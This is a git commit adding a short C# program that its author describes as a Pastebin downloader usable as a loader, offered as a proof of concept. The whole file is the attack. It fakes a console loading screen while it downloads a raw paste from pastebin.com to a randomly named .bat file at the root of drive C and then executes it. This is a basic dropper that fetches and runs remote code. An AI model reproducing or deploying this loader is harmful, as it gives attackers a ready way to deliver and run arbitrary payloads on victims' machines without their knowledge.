30fcf1d1d53f905ed308c553bd0b159835d24c48
elfy <75458737+xoElf@users.noreply.github.com>
2021-12-09 19:30:14 -0800

    Pastebin Downloader (Can be used as a loader)
    Downloads a raw text file from a paste bin, saves it as a batch. Proof of concept.

---
+++ PastebinLoaderV2/Program.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Threading;
+
+
+namespace Pastebin_Downloader
+{
+    class Application
+    {
+        static void Main(string[] args)
+        {
+            {
+                using (WebClient web = new WebClient())
+                {
+                    {
+                        Console.Title = "Loading...";
+                        Console.ForegroundColor = ConsoleColor.Blue;
+                        Thread.Sleep(100);
+                        Console.WriteLine("Loading - <12%>");
+                        Console.ForegroundColor = ConsoleColor.Blue;
+                        Thread.Sleep(100);
+                        Console.Clear();
+                        Console.WriteLine("Loading - <48%>");
+                        web.DownloadFile("https://pastebin.com/raw/EXAMPLE383", @"C:\90j7g12vb.bat");
+                        Console.ForegroundColor = ConsoleColor.Blue;
+                        Thread.Sleep(100);
+                        Console.Clear();
+                        Console.WriteLine("Loading - <100%>");
+                        Thread.Sleep(100);
+                        Console.Clear();
+                        Process.Start(new ProcessStartInfo()
+                        {
+                          FileName = "C:\\90j7g12vb.bat",
+                          UseShellExecute = true,
+                          Verb = "open"
+                        });
+                    }
+                }
+            }
+        }
+    }
+}
